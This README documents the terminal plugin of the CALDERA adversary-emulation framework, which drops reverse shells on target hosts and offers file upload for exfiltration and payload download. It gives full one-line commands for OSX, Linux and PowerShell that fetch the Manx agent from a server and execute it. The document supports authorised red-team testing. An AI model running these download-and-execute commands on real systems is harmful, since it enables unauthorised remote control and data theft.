Plugin: terminal
=============

The terminal plugin adds reverse-shell capability to CALDERA. 

When this plugin is loaded, you'll get access to a new GUI page which allows you to drop reverse-shells on target hosts 
and interact manually with the hosts. 

You can use the terminal emulator on the Terminal GUI page to interact with your sessions. 

### Custom commands

There are a handful of custom commands built into the reverse-shell.

* **upload**: exfil a single file to the server
> example: upload notes.txt
* **download**: drop any file from any of the server's payload directories on the target
> example: download sandcat.go-linux

## Manx agent

The terminal plugin provides an agent called Manx. Manx can use the TCP or UDP contacts available on the server, 
defaulting to TCP. To deploy Manx, use one of the below commands

> You can also go to the plugins -> terminal GUI page and view these same delivery commands, along with a few other customized options. 

**OSX**:
```
server="http://localhost:8888";socket="localhost:5678";contact="tcp";agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null && ./$agent -http $server -socket $socket -contact $contact -v;
```

**Linux**:
```
server="http://localhost:8888";socket="localhost:5678";contact="tcp";agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null && ./$agent -http $server -socket $socket -contact $contact -v;
```

**Windows / PowerShell**:
```
$server="http://localhost:8888"; $socket="0.0.0.0:5678"; $contact="tcp"; $url="$server/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","manx.go"); ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null; iex "C:\Users\Public\$name.exe -http $server -socket $socket -contact $contact -v";
```

Note the each of the commands above use 3 parameters: 

**server**: the FQDN of the server

**socket**: the socket address to connect to. Replace 0.0.0.0 with teh server IP address. The port can be either 5678 
(for TCP) or 5679 (for UDP).

**contact**: which contact to use, this can be either TCP or UDP.
